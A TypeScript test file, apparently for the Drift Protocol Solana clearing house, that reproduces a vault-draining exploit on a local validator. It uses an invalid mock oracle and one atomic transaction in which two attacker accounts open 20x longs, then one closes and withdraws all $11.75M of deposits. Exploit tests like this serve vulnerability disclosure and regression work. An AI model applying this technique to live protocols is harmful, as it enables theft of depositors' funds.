import * as anchor from '@project-serum/anchor';
import { BN, ClearingHouseUser, Markets } from '../sdk/src';
import { assert } from 'chai';

import { Program, Wallet } from '@project-serum/anchor';

import { Keypair, PublicKey, Transaction } from '@solana/web3.js';

import { Admin, ClearingHouse } from '../sdk/src';

import { mockOracle, mockUSDCMint, mockUserUSDCAccount } from './testHelpers';
import {
	calculateMarkPrice,
	OracleSource,
	PositionDirection,
	QUOTE_PRECISION,
} from '../sdk';

describe('drift drain', () => {
	const provider = anchor.AnchorProvider.local(undefined, {
		commitment: 'confirmed',
		preflightCommitment: 'confirmed',
	});
	const connection = provider.connection;
	anchor.setProvider(provider);
	const chProgram = anchor.workspace.ClearingHouse as Program;

	let usdcMint;
	let admin: Admin;

	// SOL amm config when paused
	const ammQuoteAssetReserve = new BN('5000000000000000000');
	const ammBaseAssetReserve = new BN('5000000000000000000');
	const peg = new BN(53000);

	it('drain', async () => {
		usdcMint = await mockUSDCMint(provider);

		admin = Admin.from(connection, provider.wallet, chProgram.programId, {
			commitment: 'confirmed',
		});
		await admin.initialize(usdcMint.publicKey, false);

		await admin.subscribe();

		// huge confidence to make oracle invalid
		const solUsd = await mockOracle(53, -7, 2147483647);
		const periodicity = new BN(60 * 60); // 1 HOUR

		await admin.initializeMarket(
			Markets[0].marketIndex,
			solUsd,
			ammBaseAssetReserve,
			ammQuoteAssetReserve,
			periodicity,
			peg,
			OracleSource.PYTH,
			500,
			333,
			222
		);

		const createUser = async (
			usdcAmount
		): Promise<[Keypair, ClearingHouse, ClearingHouseUser, PublicKey]> => {
			const userKeyPair = new Keypair();
			await provider.connection.requestAirdrop(userKeyPair.publicKey, 10 ** 9);
			const userUSDCAccount = await mockUserUSDCAccount(
				usdcMint,
				usdcAmount,
				provider,
				userKeyPair.publicKey
			);
			const clearingHouse = ClearingHouse.from(
				connection,
				new Wallet(userKeyPair),
				chProgram.programId,
				{
					commitment: 'confirmed',
				}
			);
			await clearingHouse.subscribe();
			await clearingHouse.initializeUserAccountAndDepositCollateral(
				usdcAmount,
				userUSDCAccount.publicKey
			);

			const clearingHouseUser = ClearingHouseUser.from(
				clearingHouse,
				userKeyPair.publicKey
			);
			await clearingHouseUser.subscribe();

			return [
				userKeyPair,
				clearingHouse,
				clearingHouseUser,
				userUSDCAccount.publicKey,
			];
		};

		// $10M innocent deposits
		const oneMillionUSDC = new BN(1000000).mul(QUOTE_PRECISION);
		for (let i = 0; i < 10; i++) {
			await createUser(oneMillionUSDC);
		}

		const attackDepositPerAccount = new BN(1750000)
			.mul(QUOTE_PRECISION)
			.div(new BN(2));
		const [
			_,
			firstAttackerClearingHouse,
			firstAttackerUser,
			firstAttackerUserUSDCAccount,
		] = await createUser(attackDepositPerAccount);
		const [
			secondAttackerKeypair,
			secondAttackerClearingHouse,
			secondAttackerUser,
		] = await createUser(attackDepositPerAccount);

		console.log(
			'price before',
			calculateMarkPrice(admin.getMarket(0)).toString()
		);

		const solMarketIndex = new BN(0);
		const leverage = new BN(20);

		// assert $11.75M deposited
		// whole vault is 11.75M, first and second attacker have $.875M each
		const wholeVaultBefore = new BN(
			(
				await admin.connection.getTokenAccountBalance(
					admin.getStateAccount().collateralVault
				)
			).value.amount
		);
		assert(wholeVaultBefore.eq(new BN(11750000).mul(QUOTE_PRECISION)));
		const firstAttackerUserCollateralBefore =
			firstAttackerUser.getUserAccount().collateral;
		assert(
			firstAttackerUserCollateralBefore.eq(new BN(875000).mul(QUOTE_PRECISION))
		);
		const secondAttackerUserCollateralBefore =
			secondAttackerUser.getUserAccount().collateral;
		assert(
			secondAttackerUserCollateralBefore.eq(new BN(875000).mul(QUOTE_PRECISION))
		);

		const firstUserOpenIx = await firstAttackerClearingHouse.getOpenPositionIx(
			PositionDirection.LONG,
			firstAttackerUserCollateralBefore.mul(leverage),
			solMarketIndex
		);
		const secondUserOpenIx =
			await secondAttackerClearingHouse.getOpenPositionIx(
				PositionDirection.LONG,
				secondAttackerUserCollateralBefore.mul(leverage),
				solMarketIndex
			);
		const firstUserCloseIx =
			await firstAttackerClearingHouse.getClosePositionIx(solMarketIndex);
		const firstUserWithdrawIx =
			await firstAttackerClearingHouse.getWithdrawCollateralIx(
				wholeVaultBefore,
				firstAttackerUserUSDCAccount
			);

		// first user opens, second user opens, first closes, first withdraws
		const tx = new Transaction()
			.add(firstUserOpenIx)
			.add(secondUserOpenIx)
			.add(firstUserCloseIx)
			.add(firstUserWithdrawIx);

		await firstAttackerClearingHouse.txSender.send(tx, [secondAttackerKeypair]);

		// assert first attacker takes whole vault ($11.75M)
		const firstUserBalanceAfter = new BN(
			(
				await firstAttackerClearingHouse.connection.getTokenAccountBalance(
					firstAttackerUserUSDCAccount
				)
			).value.amount
		);
		console.assert(wholeVaultBefore.eq(firstUserBalanceAfter));

		await admin.unsubscribe();
		await firstAttackerClearingHouse.unsubscribe();
		await firstAttackerUser.unsubscribe();
		await secondAttackerClearingHouse.unsubscribe();
		await secondAttackerUser.unsubscribe();
	});
});
